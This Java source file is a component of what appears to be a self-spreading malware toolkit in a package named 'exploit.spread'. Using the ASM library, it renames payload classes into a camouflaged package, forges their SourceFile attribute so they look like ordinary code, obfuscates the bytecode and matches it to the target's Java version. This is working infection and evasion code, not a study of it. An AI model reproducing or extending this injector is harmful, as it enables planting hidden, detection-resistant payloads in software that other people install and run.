package com.tmquan2508.exploit.spread;

import com.tmquan2508.exploit.Exploit;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.commons.ClassRemapper;
import org.objectweb.asm.commons.SimpleRemapper;

import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;

public final class PayloadInjector {

    public static class SourceFileVisitor extends ClassVisitor {
        private final String newSourceFileName;
        private boolean sourceAttributeFound = false;

        public SourceFileVisitor(ClassVisitor classVisitor, String newSourceFileName) {
            super(org.objectweb.asm.Opcodes.ASM9, classVisitor);
            this.newSourceFileName = newSourceFileName;
        }

        @Override
        public void visitSource(String source, String debug) {
            super.visitSource(this.newSourceFileName, debug);
            this.sourceAttributeFound = true;
        }

        @Override
        public void visitEnd() {
            if (!sourceAttributeFound) {
                super.visitSource(this.newSourceFileName, null);
            }
            super.visitEnd();
        }
    }


    public record Result(String finalPayloadFQN, Map<String, byte[]> allPayloadBytecode) {}

    public static Result inject(Class<?> sourceBaseClass, CamouflageUtils.CamouflagePlan plan, PatchUtils.JavaVersion dominantVersion) throws Exception {
        Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Starting payload injection.");
        List<Class<?>> classesToInject = PatchUtils.getClassesToInject(sourceBaseClass);

        Map<String, String> relocationMap = new HashMap<>();
        String finalPayloadFQN;
        String newPackageName = plan.packageName().replace('/', '.');

        Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Building relocation map for renaming...");

        String newBaseFQN = newPackageName + "." + plan.namePrefix();
        finalPayloadFQN = newBaseFQN;

        String sourceBaseFQN = sourceBaseClass.getName();

        for (Class<?> clazz : classesToInject) {
            String sourceFQN = clazz.getName();
            String destFQN = sourceFQN.replace(sourceBaseFQN, newBaseFQN);

            relocationMap.put(sourceFQN.replace('.', '/'), destFQN.replace('.', '/'));
            Exploit.sender.sendDebug(Level.INFO, String.format("  |-> MAP: '%s' ==> '%s'", sourceFQN, destFQN));
        }

        SimpleRemapper remapper = new SimpleRemapper(relocationMap);
        Map<String, byte[]> allPayloadBytecode = new HashMap<>();

        Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Loading and transforming payload classes...");
        for (Class<?> clazz : classesToInject) {
            String resourcePath = clazz.getName().replace('.', '/') + ".class";
            try (InputStream is = clazz.getClassLoader().getResourceAsStream(resourcePath)) {
                if (is == null) throw new IOException("Cannot find payload resource: " + resourcePath);

                ClassReader classReader = new ClassReader(is);
                ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);

                String originalInternalName = clazz.getName().replace('.', '/');
                String newInternalName = remapper.map(originalInternalName);
                String newSimpleName = newInternalName.substring(newInternalName.lastIndexOf('/') + 1);
                String newSourceFileName = newSimpleName + ".java";
                Exploit.sender.sendDebug(Level.INFO, "  |-> Faking SourceFile to: " + newSourceFileName);

                SourceFileVisitor sourceFileVisitor = new SourceFileVisitor(classWriter, newSourceFileName);
                ClassRemapper classRemapper = new ClassRemapper(sourceFileVisitor, remapper);

                classReader.accept(classRemapper, ClassReader.EXPAND_FRAMES);

                byte[] renamedBytecode = classWriter.toByteArray();
                String newFQN = remapper.map(clazz.getName().replace('.', '/')).replace('/', '.');

                byte[] finalBytecode = PayloadObfuscator.transform(renamedBytecode, newFQN);

                PatchUtils.setVersion(finalBytecode, dominantVersion);

                allPayloadBytecode.put(newFQN, finalBytecode);
                Exploit.sender.sendDebug(Level.INFO, "  |-> Transformed (in memory): " + newFQN);
            }
        }

        Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Payload injection phase complete.");
        return new Result(finalPayloadFQN, allPayloadBytecode);
    }
}